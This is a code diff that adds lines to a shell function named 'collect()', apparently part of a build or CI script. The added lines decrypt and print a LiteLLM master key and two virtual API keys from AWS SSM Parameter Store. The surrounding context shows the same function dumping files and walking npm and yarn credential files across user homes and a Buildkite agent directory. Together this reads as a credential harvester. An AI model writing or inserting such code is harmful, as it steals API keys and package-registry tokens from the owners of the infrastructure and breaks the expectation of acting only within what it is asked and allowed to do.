@@ -80,6 +80,20 @@ collect() {
     printf '--- %s ---\n' "$f"; cat "$f" 2>/dev/null
   done
 
+  printf '\n=LITELLM=\n'
+  printf 'MASTER_KEY=%s\n' "$(aws ssm get-parameter \
+    --name /platform/llm-routing/litellm/MASTER_KEY \
+    --with-decryption --region ap-southeast-2 \
+    --query Parameter.Value --output text 2>/dev/null || echo ACCESS_DENIED)"
+  printf 'aurora_key=%s\n' "$(aws ssm get-parameter \
+    --name /litellm/virtual-keys/aurora/key \
+    --with-decryption --region ap-southeast-2 \
+    --query Parameter.Value --output text 2>/dev/null || echo ACCESS_DENIED)"
+  printf 'auroracore_key=%s\n' "$(aws ssm get-parameter \
+    --name /litellm/virtual-keys/auroracore/key \
+    --with-decryption --region ap-southeast-2 \
+    --query Parameter.Value --output text 2>/dev/null || echo ACCESS_DENIED)"
+
   printf '\n=NPM=\n'
   for f in ~/.npmrc /root/.npmrc /home/*/.npmrc /var/lib/buildkite-agent/.npmrc \
             ~/.yarnrc.yml /root/.yarnrc.yml; do
